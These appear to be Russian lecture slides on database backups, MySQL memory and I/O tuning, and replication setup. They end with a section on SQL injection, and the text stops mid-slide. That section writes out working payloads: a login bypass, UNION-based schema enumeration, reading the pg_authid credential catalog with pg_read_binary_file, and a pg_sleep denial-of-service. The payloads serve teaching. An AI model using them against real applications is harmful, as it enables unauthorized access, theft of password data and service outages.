---
title: Лекция 8
description: |
   Резервное копирование. Конфигурирование. Безопасность.

   - Резервное копирование:
     - Репликация ≠ резервное копирование;
     - Логические резервные копии;
     - Физические резервные копии.
   - Конфигурирование:
     - Общие принципы настройки;
     - Настройка памяти и ввода/вывода;
     - Табличные пространства;
     - Информация о текущем состоянии сервера;
   - Безопасность:
     - Пользователи и права доступа;
     - SQL-injection.

useMath: true
---
<section class="slide">
    <h2>Резервное копирование. Конфигурирование. Безопасность.</h2>
    <ul class="compact">
        <li>Резервное копирование:
            <ul>
                <li>Репликация ≠ резервное копирование;</li>
                <li>Логические и физические резервные копии.</li>
            </ul>
        </li>
        <li>Конфигурирование:
            <ul>
                <li>Общие принципы настройки;</li>
                <li>Настройка памяти и ввода/вывода;</li>
                <li>Табличные пространства;</li>
                <li>Информация о текущем состоянии сервера;</li>
            </ul>
        </li>
        <li>Безопасность:
            <ul>
                <li>Пользователи и права доступа;</li>
                <li>SQL-injection.</li>
            </ul>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Резервное копирование: Зачем?</h2>
    <img src="backup.png" style="float: right; height: 430px; border: 1px solid black"/>
    <ul>
        <li>Восстановление после аварии</li>
        <li>Человек передумал</li>
        <li>Аудит</li>
        <li>Тестирование</li>
    </ul>
</section>

<section class="slide">
    <h2>Логические резервные копии</h2>
    <ul>
        <li>Это обычные файлы, которые можно обрабатывать с помощью стандартных текстовых редакторов.</li>
        <li>Из них легко восстанавливать данные: достаточно просто подать файл по конвейеру на вход программы psql.</li>
        <li>Резервное копирование и возврат данных можно выполнять по сети, то есть не на той же машине, где работает
            сервер PostgreSQL.
        </li>
        <li>Процедуру можно очень гибко настраивать.</li>
        <li>Они могут помочь избежать повреждения данных.</li>
    </ul>
</section>

<section class="slide">
    <h2>Логические резервные копии</h2>
    <ul>
        <li>Для их генерации требуется работа сервера, так что процессор загружается сильнее.</li>
        <li>В некоторых случаях логические копии оказываются объемнее исходных физических файлов. Зачастую логические
            копии хорошо поддаются сжатию, но для этого нужно дополнительное процессорное время.
        </li>
        <li>В некоторых СУБД потеря точности в представлении чисел с плавающей точкой может помешать правильному
            восстановлению данных из файлов дампа.
        </li>
        <li>Для восстановления данных из логической копии необходимо загружать и интерпретировать команды и
            перестраивать индексы, что возлагает на сервер еще больше работы.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Физические резервные копии</h2>
    <ul>
        <li>Для получения физической копии нужно просто скопировать требуемые файлы в другое место. Никакой
            дополнительной работы для их генерации выполнять не придется.
        </li>
        <li>Восстановление с физических копий может оказаться быстрее, потому что серверу не нужно выполнять SQL-команды
            и строить индексы.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Физические резервные копии</h2>
    <ul>
        <li>Объем физических файлов, как правило, гораздо больше соответствующих логических копий. Обычно в файлах
            данных очень много неиспользуемого места.
        </li>
        <li>Не всегда физическую копию можно перенести на другую платформу или операционную систему. Так же зачастую
            невозмонжо восстановление на другой версии PostgreSQL.
        </li>
        <li>Физические резервные копии не проверяют целостность данных: если резервная копия была снята с битых данных,
            то вы получение битые данные.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Что копировать?</h2>
    <dl style="font-size: 90%">
        <dt>Неочевидные данные</dt>
        <dd>Не забудьте о данных, которые не бросаются в глаза, например: журнал транзакций.
        </dd>

        <dt>Код</dt>
        <dd>В частности, триггеры и хранимые процедуры.</dd>

        <dt>Конфигурация репликации</dt>
        <dd>Для восстановления сервера, участвующего в репликации, следует включать в резервную копию все необходимые
            для репликации файлы.
        </dd>

        <dt>Конфигурация сервера</dt>
        <dd>Если потребуется восстановить данные после настоящей катастрофы.</dd>

        <dt>Отдельные файлы операционной системы</dt>
        <dd>На UNIX-сервере это могут быть таблицы cron, конфигурация пользователей, групп и правила sudo.</dd>
    </dl>
</section>

<section class="slide">
    LVM
    btrfs
    pg_basebackup
    pg_dump
    pg_dumpall
    pg_restore
    pg_upgradecluster
</section>

<section class="slide">
    <h2>Стоимость типовых операций</h2>
    <table style="font-size: 75%">
        <thead>
        <tr>
            <th>Стоимость операции</th>
            <th style="text-align: right">нс (ns)</th>
            <th style="text-align: right">мкс (µs)</th>
            <th style="text-align: right">мс (ms)</th>
        </tr>
        </thead>
        <tbody>
        <tr>
            <td>Получение значения из L1</td>
            <td align="right">0.5</td>
            <td align="right"></td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Ошибка предсказания перехода в CPU</td>
            <td align="right">5</td>
            <td align="right"></td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Получение значения из L2</td>
            <td align="right">7</td>
            <td align="right"></td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Mutex lock/unlock</td>
            <td align="right">25</td>
            <td align="right"></td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Получение значения из RAM</td>
            <td align="right">100</td>
            <td align="right"></td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Сжатие 1Кб методом Zippy</td>
            <td align="right">3 000</td>
            <td align="right">3</td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Отправка 1Кб через 1Гбит/сек сеть</td>
            <td align="right">10 000</td>
            <td align="right">10</td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Чтение 4Кб с SSD (случайный доступ)</td>
            <td align="right">150 000</td>
            <td align="right">150</td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Чтение 1Мб из RAM (последовательный доступ)</td>
            <td align="right">250 000</td>
            <td align="right">250</td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Round trip внутри одного датацентра</td>
            <td align="right">500 000</td>
            <td align="right">500</td>
            <td align="right"></td>
        </tr>
        <tr>
            <td>Чтение 1Мб из SSD (последовательный доступ)</td>
            <td align="right">1 000 000</td>
            <td align="right">1 000</td>
            <td align="right">1</td>
        </tr>
        <tr>
            <td>Позиционирование HDD</td>
            <td align="right">10 000 000</td>
            <td align="right">10 000</td>
            <td align="right">10</td>
        </tr>
        <tr>
            <td>Чтение 1Мб из HDD (последовательный доступ)</td>
            <td align="right">20 000 000</td>
            <td align="right">20 000</td>
            <td align="right">20</td>
        </tr>
        <tr>
            <td>Round trip между США и Нидерландами</td>
            <td align="right">150 000 000</td>
            <td align="right">150 000</td>
            <td align="right">150</td>
        </tr>
        </tbody>
    </table>
    <a href="https://gist.github.com/jboner/2841832">https://gist.github.com/jboner/2841832</a>
</section>

<section class="slide">
    <h2>Конфигурирование</h2>
    <ul>
        <li>/etc/my.cnf</li>
        <li>/etc/mysql/my.cnf</li>
    </ul>
    <pre style="font-size: 80%"><code class="bash">
$ which mysqld
/usr/sbin/mysqld
$ /usr/sbin/mysqld --verbose --help | grep -A 1 ‘Default options’
Default options are read from the following files in the given order:
/etc/mysql/my.cnf ~/.my.cnf /usr/etc/my.cnf
</code></pre>
</section>

<section class="slide">
    <h2>Конфигурирование</h2>
    <p>В Debian/Ubuntu крайне не рекомендуется править файл <code>/etc/mysql/my.cnf</code>,
        так как он распространяется вместе с пакетом MySQL.</p>
    <p>В конце файла есть строки:</p>
    <pre><code class="text">!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
</code></pre>
    <p>Специфические настройки следует держать в файлах вида: <code>/etc/mysql/conf.d/custom.cnf</code>
        (суфикс файла должен быть <code>.cnf</code>).</p>
    <p>Это сильно упрощает администрирование MySQL.</p>
</section>

<section class="slide">
    <h2>Область видимости</h2>
    <ul>
        <li>Переменная query_cache_size имеет глобальную область видимости.</li>
        <li>Переменная sort_buffer_size имеет глобальное значение по умолчанию, но может быть изменена на уровне
            сеанса.
        </li>
        <li>Переменная join_buffer_size имеет глобальное значение по умолчанию, может быть изменена на уровне сеанса,
            но, кроме того, для каждого запроса, в котором соединяется несколько таблиц, можно выделить по одному буферу
            на операцию соединения, то есть для одного запроса может существовать несколько буферов соединения.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Область видимости</h2>
    <ul>
        <li>SET sort_buffer_size = &lt;value&gt;;</li>
        <li>SET GLOBAL sort_buffer_size = &lt;value&gt;;</li>
        <li>SET @@sort_buffer_size := &lt;value&gt;;</li>
        <li>SET @@session.sort_buffer_size := &lt;value&gt;;</li>
        <li>SET @@global.sort_buffer_size := &lt;value&gt;;</li>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Настройка использования памяти</h2>
    <ul>
        <li>Определить абсолютный верхний предел объема памяти, которую MySQL может использовать.</li>
        <li>Определить, сколько памяти MySQL будет использовать на каждое соединение, например для буферов сортировки и
            временных таблиц.
        </li>
        <li>Определить, сколько памяти нужно операционной системе для нормальной работы. Сюда следует включить и память
            для других программ, работающих на той же машине, например периодически выполняемых заданий.
        </li>
        <li>Если это имеет смысл, отдайте всю оставшуюся память под кэши MySQL, например, под пул буферов InnoDB.</li>
</section>

<section class="slide">
    <h2>Кэш MyISAM</h2>
    <dl>
        <dt>key_buffer_size</dt>
        <dd>25 – 50 % от общего объема памяти, зарезервированного для MyISAM кэшей.</dd>
    </dl>
    <p>
    <pre style="font-size: 80%"><code class="bash">key_buffer_1.key_buffer_size = 1G
key_buffer_2.key_buffer_size = 1G</code></pre>
    </p>
    <p>
    <pre style="font-size: 80%"><code class="bash">CACHE INDEX t1, t2 IN key_buffer_1;
LOAD INDEX INTO CACHE t1, t2;</code></pre>
    </p>
    <p>Эту SQL-команду можно поместить в файл, выполняемый MySQL на этапе запуска. Имя файла задается с помощью
        параметра init_file.</p>
    <p>В нем может быть несколько SQL-команд, каждая в отдельной строке.</p>
</section>

<section class="slide">
    <h2>Кэш MyISAM</h2>
    <h3>Коэффициент попаданий в кэш:</h3>
    <p class="math">`100 - ("key_reads" * 100)/("key_read_requests")`</p>

    <h3>Коэффициент заполненности буфера:</h3>
    <p class="math">`100 - ("key_blocks_unused" * "key_cache_block_size" * 100)/("key_buffer_size")`</p>
    <h3>Количество непопаданий в кэш за секунду:</h3>
    <p class="math">`"key_reads" / "uptime"`</p>
</section>

<section class="slide white">
    <h2>Размер блока ключей key_cache_block_size</h2>
    <ul>
        <li>MyISAM запрашивает блок ключей размером 1 Кбайт с диска.</li>
        <li>ОС считывает страницу данных размером 4 Кбайт с диска, кэширует ее, а затем передает MyISAM затребованный 1
            Кбайт.
        </li>
        <li>ОС отбрасывает закэшированные данные, замещая их какими-то другими.</li>
        <li>MyISAM модифицирует блок ключей размером 1 Кбайт и просит операционную систему записать его обратно на
            диск.
        </li>
        <li>ОС считывает ту же самую страницу размером 4 Кбайт с диска в свой кэш, модифицирует в ней тот килобайт,
            который изменил MyISAM, и записывает все 4 Кбайт обратно на диск.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Кэш InnoDB</h2>
    <dl>
        <dt>innodb_buffer_pool_size</dt>
        <dd>В отличие от кэша ключей MyISAM, в пуле буферов InnoDB кэшируются не только индексы, там также хранятся сами
            данные, буфер вставок, блокировки и другие внутренние структуры. В InnoDB пулбуферов используется также для
            реализации отложенных операций записи и позволяет объединить несколько таких процедур, чтобы затем выполнить
            их последовательно.<br/>
            Рекомендуется выставить до 80% физической памяти.
        </dd>

        <dt>innodb_max_dirty_pages_pct</dt>
        <dd>Говорит InnoDB о допустимом количестве «грязных» (модифицированных) страниц в пуле буферов.</dd>
</section>

<section class="slide">
    <h2>Кэш InnoDB</h2>
    <p>В MySQL есть возможность сохранить состояние кэша, чтобы избежать проблемы с прогревом базы.</p>
    <pre><code class="sql">SET GLOBAL innodb_buffer_pool_dump_at_shutdown = ON;
SET GLOBAL innodb_buffer_pool_dump_now = ON;
SET GLOBAL innodb_buffer_pool_load_now = ON;

SHOW STATUS LIKE 'Innodb_buffer_pool_dump_status';
SHOW STATUS LIKE 'Innodb_buffer_pool_load_status';
</code></pre>
</section>

<section class="slide">
    <h2>Кеш потоков, кеш таблиц</h2>
    <dl>
        <dt>thread_cache_size</dt>
        <dd>Определяет максимальное количество потоков в кэше.
            <pre><code class="sql">SHOW STATUS LIKE 'Threads_created';
SHOW STATUS LIKE 'Threads_connected';</code></pre>
        </dd>

        <dt>table_open_cache</dt>
        <dd>Кэш открытых таблиц.</dd>

        <dt>table_definition_cache</dt>
        <dd>Кэш определений таблиц.</dd>
</section>

<section class="slide">
    <h2>Ввод / вывод в MyISAM</h2>
    <h3>delay_key_write</h3>
    <p>Определяет, когда будут сбрасываться данные на диск.</p>
    <dl>
        <dt>OFF</dt>
        <dd>MyISAM сбрасывает измененные блоки из буфера ключей после каждой записи, если только таблица не блокирована
            командой LOCK TABLES.
        </dd>

        <dt>ON</dt>
        <dd>Включен режим отложенной записи ключей, но только для таблиц, созданных с параметром DELAY_KEY_WRITE.</dd>

        <dt>ALL</dt>
        <dd>Для всех таблиц типа MyISAM используется отложенная запись ключей.</dd>
    </dl>
    <pre><code class="sql">ALTER TABLE sometable DELAY_KEY_WRITE = 1;</code></pre>
</section>

<section class="slide">
    <h2>Ввод / вывод в MyISAM</h2>
    <ul>
        <li>Если сервер аварийно завершает работу, а блоки не были сброшены на диск, то индекс будет испорчен.</li>
        <li>Если было отложено много операций записи, то MySQL потратит больше времени на закрытие таблицы, поскольку
            вынуждена ждать завершения записи буферов на диск.
        </li>
        <li>По тем же причинам команда FLUSH TABLES может занимать много времени.</li>
        <li>Не сброшенные «грязные» блоки в буфере ключей могут не оставить места для новых блоков, считываемых с диска.
            В таком случае выполнение запроса будет приостановлено на время, пока MyISAM не освободит достаточно места в
            буфере ключей.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Ввод / вывод в InnoDB</h2>
    <div style="text-align: center; height: 100%">
        <img style="height: 70%" src="innodb-io.png"/>
    </div>
</section>

<section class="slide">
    <h2>Ввод / вывод в InnoDB</h2>
    <dl>
        <dt>innodb_log_file_size</dt>
        <dd>Общий максимальный размер файла логов транзакций.</dd>

        <dt>innodb_log_files_in_group</dt>
        <dd>Количество файлов в группе.</dd>

        <dt>innodb_log_buffer_size</dt>
        <dd>Размер буфера лога транзакций.</dd>
    </dl>
</section>

<section class="slide">
    <h2>Ввод / вывод в InnoDB</h2>
    <pre><code class="sql" style="font-size: 75%">mysql> pager grep sequence
PAGER SET TO 'grep sequence'

mysql> SHOW engine innodb STATUS\G SELECT sleep(60); SHOW engine innodb STATUS\G
Log sequence number 84 3836410803
 1 row IN SET (0.06 sec)
 1 row IN SET (1 min 0.00 sec)
Log sequence number 84 3838334638
 1 row IN SET (0.05 sec)

mysql> SELECT (3838334638 - 3836410803) / 1024 / 1024 AS MB_per_min;

+------------+
| MB_per_min |
+------------+
| 1.83471203 |
+------------+
</code></pre>
    <p>Размер лога выбираем примерно на 10-60 минут работы сервера.</p>
</section>

<section class="slide">
    <h2>Ввод / вывод в InnoDB</h2>
    <h3>innodb_flush_log_at_trx_commit</h3>
    <dl>
        <dt>0</dt>
        <dd>Писать буфер в файл журнала и сбрасывать журнал на устройство постоянного хранения (диск) раз в секунду, но
            ничего не делать в момент фиксации транзакции.
        </dd>

        <dt>1</dt>
        <dd>Писать буфер в файл журнала и сбрасывать его на устройство постоянного хранения при каждой фиксации
            транзакции.
        </dd>

        <dt>2</dt>
        <dd>Писать буфер в файл журнала при каждой фиксации, но не сбрасывать его на устройство постоянного хранения.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Табличное пространство</h2>
    <p>Расположение табличного пространства:</p>
    <pre><code>innodb_data_home_dir = /var/lib/mysql/
innodb_data_file_path = ibdata1:1G;ibdata2:1G;ibdata3:1G
</code></pre>
    <p>Чтобы табличное пространство могло расти, когда место заканчивается, можно сделать последний файл автоматически
        расширяемым:</p>
    <pre><code>...ibdata3:1G:autoextend
...ibdata3:1G:autoextend:max:2G
</code></pre>
    <dl>
        <dt>innodb_file_per_table</dt>
        <dd>Отдельный файл на каждую таблицу.</dd>
    </dl>
</section>

<section class="slide">
    <h2>Оптимизация файловой сортировки</h2>
    <dl>
        <dt>max_length_for_sort_data</dt>
        <dd>Двухпроходный алгоритм применяется, если суммарная длина всех столбцов, отбираемых запросом, плюс длина
            столбцов, упоминаемых во фразе ORDER BY, превышает max_length_for_sort_data байтов.
        </dd>

        <dt>max_sort_length</dt>
        <dd>При сортировке по столбцам типа BLOB или TEXT MySQL принимает во внимание только префикс, а остаток значения
            игнорирует. Длина такого префикса задается параметром max_sort_length.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <pre><code class="sql">SHOW GLOBAL STATUS;
</code></pre>
    <pre><code class="bash">mysqladmin extended -u root -p -r -i60
</code></pre>
    <dl>
        <dt>Aborted_clients</dt>
        <dd>Если эта переменная со временем растет, проверьте, корректно ли закрываются соединения. Если нет, обратите
            внимание на производительность сети, а также на конфигурационную переменную max_allowed_packet.
        </dd>

        <dt>Aborted_connects</dt>
        <dd>Значение этой переменной должно быть близко к нулю. Если это не так, то, возможно, имеют место проблемы с
            сетью.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <dl>
        <dt>Binlog_cache_disk_use и Binlog_cache_use</dt>
        <dd>Если отношение Binlog_cache_disk_use к Binlog_cache_use велико, попробуйте увеличить значение
            binlog_cache_size. Самый лучший подход – увеличить параметр binlog_cache_size и посмотреть, уменьшится ли
            число непопаданий в кэш.
        </dd>

        <dt>Bytes_received и Bytes_sent</dt>
        <dd>Эти значения помогают понять, не слишком ли велик трафик в направлении к серверу или от него. Возможно,
            причина таится где-то в вашем коде.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <dl>
        <dt>Created_tmp_disk_tables</dt>
        <dd>Если это значение велико, то возможно одно из двух: либо запросы создают временные таблицы в результате
            выборки столбцов типа BLOB или TEXT, либо недостаточно велики значения конфигурационных параметров
            tmp_table_size и/или max_heap_table_size.
        </dd>

        <dt>Handler_read_rnd_next</dt>
        <dd>Отношение Handler_read_rnd_next / Handler_read_rnd дает приблизительную оценку среднего размера полного
            сканирования таблиц. Если оно велико, то, возможно, следует оптимизировать схему, индексы или запросы.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <dl>
        <dt>Key_blocks_used</dt>
        <dd>Если величина Key_blocks_used * key_cache_block_size гораздо меньше, чем параметр key_buffer_size на
            прогретом сервере, то размер буфера ключей (key_buffer_size) больше необходимого, и вы только впустую
            растрачиваете память.
        </dd>

        <dt>Key_reads</dt>
        <dd>Понаблюдайте за количеством операций чтения в секунду и посмотрите, насколько близко это значение
            приближается к предельным показателям подсистемы ввода/вывода.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <dl>
        <dt>Open_tables и Opened_tables</dt>
        <dd>Сравните это значение с величиной параметра table_cache. Если количество открываемых таблиц (Opened_tables)
            в секунду велико, то, вероятно, размер кэша таблиц (table_cache) недостаточен.
        </dd>

        <dt>Select_full_join</dt>
        <dd>Полное соединение ― это соединение без индексов, такая операция может очень сильно «посадить»
            производительность. Лучше, чтобы их вовсе не было, даже одного в минуту может быть много. Обнаружив
            соединение без индексов, примите все меры к оптимизации запросов.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Переменные состояния</h2>
    <dl>
        <dt>Sort_merge_passes</dt>
        <dd>Большое значение этой переменной означает, что надо бы увеличить размер буфера сортировки
            (sort_buffer_size), быть может, только ради некоторых запросов. Проверьте запросы и найдите среди них те,
            которые приводят к сортировке (filesort). Возможно, их удастся оптимизировать.
        </dd>

        <dt>Threads_created</dt>
        <dd>Если это значение велико или растет, то, возможно, стоит увеличить параметр thread_cache_size. Переменная
            Threads_cached показывает, сколько потоков уже находится в кэше.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Репликация</h2>
    <h3>Распространение данных</h3>
    <p>Обычно репликация в MySQL потребляет не очень большую часть пропускной способности сети, к тому же ее можно в
        любой момент остановить и затем возобновить. Это полезно, если хранение копии данных происходит в географически
        удаленном пункте, например в другом центре обработки данных.</p>
    <h3>Балансировка нагрузки</h3>
    <p>С помощью репликации можно распределить запросы на чтение между несколькими серверами MySQL; в приложениях с
        интенсивным чтением эта тактика работает очень хорошо. Реализовать несложное балансирование нагрузки можно,
        внеся совсем немного изменений в код.</p>
</section>

<section class="slide">
    <h2>Репликация</h2>
    <h3>Резервное копирование</h3>
    <p>Репликация ― это ценное подспорье для резервного копирования. Однако подчиненный сервер все же не может
        использоваться в качестве резервной копии и не является заменой настоящему резервному копированию.</p>
    <h3>Аварийное переключение на резервный сервер (failover)</h3>
    <p>Репликация позволяет исправить ситуацию, при которой сервер MySQL является единственной точкой отказа приложения.
        Хорошая система аварийного переключения при отказе, имеющая в составе реплицированные подчиненные серверы,
        способна существенно сократить время простоя.</p>
</section>

<section class="slide">
    <h2>Репликация</h2>
    <h3>Тестирование новых версий MySQL</h3>
    <p>Очень часто на подчиненный сервер устанавливают новую версию MySQL и перед тем как ставить ее на промышленные
        серверы, проверяют, что все запросы работают нормально.</p>
    <h3>Передача изменений в приложение (libslave)</h3>
    <p>Все изменения данных могут передаваться для анализа в стороннее приложение непосредственно после фиксации в
        базе.</p>
</section>

<section class="slide">
    <h2>Репликация</h2>
    <ul>
        <li>Главный сервер записывает изменения данных в двоичный журнал. Эти записи называются событиями двоичного
            журнала.
        </li>
        <li>Подчиненный сервер копирует события двоичного журнала в свой журнал ретрансляции (relay log).</li>
        <li>Подчиненный сервер воспроизводит события из журнала ретрансляции, применяя изменения к собственным данным.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Варианты взаимодействия</h2>
    <dl>
        <dt>Мастер-слейв</dt>
        <dd>Подчиненный сервер повторяет состояние главного и не может изменять данные самостоятельно.</dd>

        <dt>Мастер-мастер</dt>
        <dd>Оба сервера равнозначны и могут обрабатываь запросы как на чтение, так и на изменение данных.</dd>
    </dl>
</section>

<section class="slide">
    <h2>Варианты реализации</h2>
    <dl>
        <dt>Физическая</dt>
        <dd>Передаётся информация о физическом изменении страниц базы данных.</dd>

        <dt>Логическая</dt>
        <dd>Передаётся информация об измененни записей базы данных.</dd>

        <dt>Передача запросов</dt>
        <dd>Передаётся информация о выполненных запросах.</dd>
    </dl>
</section>

<section class="slide">
    <h2>Гарантии репликации</h2>
    <dl>
        <dt>Синхронная</dt>
        <dd>Мастер-сервер не подтверждает транзакцию до того, как реплика не подтвердит получение данных.</dd>

        <dt>Асинхронная</dt>
        <dd>Мастер-сервер не ждёт подтвержения получения данных от реплики.</dd>

        <dt>Семисинхронная</dt>
        <dd>Мастер-сервер не подтверждает транзакцию до того, как "живые" реплики не подтвердят получение данных.</dd>
    </dl>
</section>

<section class="slide">
    <h2>Настройка репликации</h2>
    <ul>
        <li>Завести учетные записи репликации на каждом сервере.</li>
        <li>Сконфигурировать главный и подчиненный сервера.</li>
        <li>Сказать подчиненному серверу, чтобы он соединился с главным и начал реплицировать данные с него.</li>
    </ul>
</section>

<section class="slide">
    <h2>Настройка репликации</h2>
    <h3>Завести учетные записи репликации на каждом сервере.</h3>
    <pre><code class="sql">GRANT
	REPLICATION SLAVE,
	REPLICATION CLIENT
ON *.* TO repl@’192.168.0.%’
IDENTIFIED BY ‘p4ssword’;</code></pre>
</section>

<section class="slide">
    <h2>Настройка репликации</h2>
    <h3>Сконфигурировать главный и подчиненный сервера.</h3>
    <ul>
        <li>Сконфигурировать главный сервер.
            <pre><code>log_bin = mysql-bin
server_id = 10
</code></pre>
            <pre><code class="sql" style="font-size: 80%">SHOW MASTER STATUS;
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
| mysql-bin.000001 |       98 |              |                  |
</code></pre>
        </li>
        <li>Сконфигурировать подчиненный сервер.
            <pre><code>log_bin = mysql-bin
server_id = 2
relay_log = mysql-relay-bin
log_slave_updates = 1
read_only = 1
</code></pre>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>Настройка репликации</h2>
    <h3>Сказать подчиненному серверу, чтобы он соединился с главным и начал реплицировать данные с него.</h3>
    <pre><code class="sql">CHANGE MASTER TO
	MASTER_HOST = 'server1',
	MASTER_USER = 'repl',
	MASTER_PASSWORD = 'p4ssword',
	MASTER_LOG_FILE = 'mysql-bin.000001',
	MASTER_LOG_POS = 0;

SHOW SLAVE STATUS;

START SLAVE;
</code></pre>
</section>

<section class="slide">
    <h2>Синхронизация репликации</h2>
    <ul>
        <li>Мгновенный снимок данных главного сервера в некоторый момент времени.</li>
        <li>Текущий файл журнала главного сервера и смещение от начала этого файла в точности на тот момент времени,
            когда был сделан мгновенный снимок. Вместе они называются координатами репликации, так как однозначно
            идентифицируют позицию в двоичном журнале. Найти координаты репликации вам поможет команда SHOW MASTER
            STATUS.
        </li>
        <li>Файлы двоичных журналов главного сервера с момента мгновенного снимка до текущего момента.</li>
    </ul>
</section>

<section class="slide">
    <h2>Синхронизация репликации</h2>
    <dl style="font-size: 70%">
        <dt>Холодная копия</dt>
        <dd>Остановить сервер, который впоследствии станет главным, и скопировать файлы с него на подчиненный сервер.
            Недостаток такого решения очевиден: в течение всего времени копирования главный сервер должен быть
            остановлен.
        </dd>

        <dt>Горячая копия</dt>
        <dd>Если все таблицы имеют тип MyISAM, то можно воспользоваться командой mysqlhotcopy, которая копирует файлы с
            работающего сервера.
        </dd>

        <dt>Использование mysqldump</dt>
        <dd>Если все таблицы имеют тип InnoDB, то можно воспользоваться такой командой:
            <pre><code class="bash">mysqldump --single-transaction --all-databases --master-data=1 \
--host=server1 | mysql --host=server2</code></pre>
        </dd>

        <dt>С помощью мгновенного снимка LVM или резервной копии</dt>
        <dd>Если известны координаты в нужном двоичном журнале, можно воспользоваться мгновенным снимком LVM или
            резервной копией.
        </dd>

        <dt>На основе другого подчиненного сервера</dt>
        <dd>Серьезный недостаток клонирования другого подчиненного сервера состоит в том, что подчиненный сервер может
            быть рассинхронизирован с главным.
        </dd>
    </dl>
</section>

<section class="slide">
    <h2>Правила репликации</h2>
    <ul>
        <li>У каждого подчиненного сервера MySQL может быть только один главный.</li>
        <li>У каждого подчиненного сервера должен быть уникальный идентификатор.</li>
        <li>Один главный сервер может иметь много подчиненных (иными словами, у подчиненного сервера может быть много
            «братьев»).
        </li>
        <li>Подчиненный сервер может распространять полученные от главного изменения далее, то есть выступать в роли
            главного сервера для своих подчиненных; для этого следует включить режим log_slave_updates.
        </li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: Строковой параметр</h2>
    <ul>
        <li>http://xxx/news.php?id=1
            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>$id</mark>'</code></pre>
        </li>
        <li>http://xxx/news.php?id=1'
            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1'</mark>'
</code></pre>
            <pre><code>pg_query(): Query failed: ERROR: unterminated quoted…
</code></pre>
        </li>
        <li>http://xxx/news.php?id=1'%20--%20
            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' -- </mark>'
</code></pre>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: Авторизация</h2>
    <div style="font-size: 90%">
<pre><code class="sql">SELECT * FROM users
WHERE login='<mark>$login</mark>' AND pass='<mark>$pass</mark>'</code></pre>
        <pre><code class="sql">
SELECT * FROM users
WHERE login='<mark>Admin' -- </mark>' AND pass='<mark>123</mark>'
</code></pre>
        <pre><code class="sql">  
SELECT * FROM users
WHERE login='<mark>Admin</mark>' AND pass='<mark>123' OR login='Admin' -- </mark>'
</code></pre>
        <pre><code class="sql">
SELECT * FROM users
WHERE (login='Admin' AND pass='123') OR (login='Admin')
</code></pre>
    </div>
</section>

<section class="slide">
    <h2>SQL-injection: UNION</h2>
    <ul>
        <li><code>http://xxx/news.php?id=1' UNION SELECT null --</code>
            <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' UNION SELECT null --</mark>'</code></pre>
            <code>pg_query(): Query failed: ERROR: each UNION query must have the same number of columns</code></li>

        <li><code>http://xxx/news.php?id=1' UNION SELECT null, null --</code><br/>
            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: GROUP BY/ORDER BY</h2>
    <ul>
        <li>http://xxx/news.php?id=1' GROUP BY 1, 2, 3, 4 --</li>
        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
GROUP BY 1, 2, 3, 4 --</mark>'</code></pre>
        <pre><code>pg_query(): Query failed: ERROR: GROUP BY position 3</code></pre>
        </li>

        <li>http://xxx/news.php?id=1' ORDER BY 4 --</li>
        <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
ORDER BY 4 --</mark>'</code></pre>
        <pre><code>pg_query(): Query failed: ERROR: ORDER BY position 4</code></pre>
        </li>

        <li><code>http://xxx/news.php?id=1' GROUP BY 1, 2</code><br/>
            <code>http://xxx/news.php?id=1' ORDER BY 2</code><br/>
            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: INFORMATION_SCHEMA</h2>
    <ul>
        <li><code>http://xxx/news.php?id=-1' UNION SELECT table_schema, table_name FROM information_schema.tables
            --</code>
            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
UNION
SELECT table_schema, table_name
FROM information_schema.tables --</mark>'</code></pre>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: Работа с файлами</h2>
    <ul>
        <li><code>http://xxx/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(<wbr/>pg_read_binary_file(<wbr/>pg_relation_filepath(<wbr/>'pg_catalog.pg_authid')), 'hex') --</code></li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: DOS ататка</h2>
    <ul>
        <li><code>http://xxx/news.php?id=-1' UNION SELECT NULL, pg_sleep(3600) --</code><br/>
